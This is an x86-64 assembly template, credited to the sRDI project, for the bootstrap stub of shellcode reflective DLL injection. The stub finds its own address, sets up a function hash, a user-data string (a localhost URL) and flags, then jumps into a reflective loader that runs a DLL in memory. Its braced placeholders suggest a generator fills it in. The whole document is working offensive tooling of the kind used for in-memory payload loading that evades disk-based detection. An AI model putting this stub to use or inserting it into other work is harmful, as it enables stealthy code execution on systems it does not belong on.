; Credits to @monoxgas: https://github.com/monoxgas/sRDI/
call 0x00                                        ; - Pushes next instruction address to stack
pop rcx                                          ; - Pop our current location in memory from the stack into rcx
sub rcx, 1                                       ; - Minus 1 from rcx to get to the call 0x00 instruction
mov r8, rcx                                      ; - Copy our location in memory to r8 before we start modifying RCX
mov edx, {function_hash}                         ; - Move user function hash into edx (SayHello)
add r8, {payload_offset} + {payload_length}      ; - Setup the location of our user data String (https://127.0.0.1:1337/)
mov r9d, {parameter_length}                      ; - The length of the user data
push rsi                                         ; - Save original value
mov rsi, rsp                                     ; - Store our current stack pointer for later
and rsp, 0x0FFFFFFFFFFFFFFF0                     ; - Align the stack to 16 bytes
sub rsp, 0x30                                    ; - Breathing room on stack (32 bytes for shadow space + 16 bytes for last args)
mov qword ptr [rsp + 0x28], rcx                  ; - Push in arg 5 (shellcode.bin base)
add rcx, {payload_offset}                        ; - The offset of the payload.dll
mov dword ptr [rsp + 0x20], {flags}              ; - Push arg 6 just above shadow space
call {loader_offset}                             ; - Transfer execution to the RDI
mov rsp, rsi                                     ; - Reset our original stack pointer
pop rsi                                          ; - Put things back where we left them
ret                                              ; - Return to caller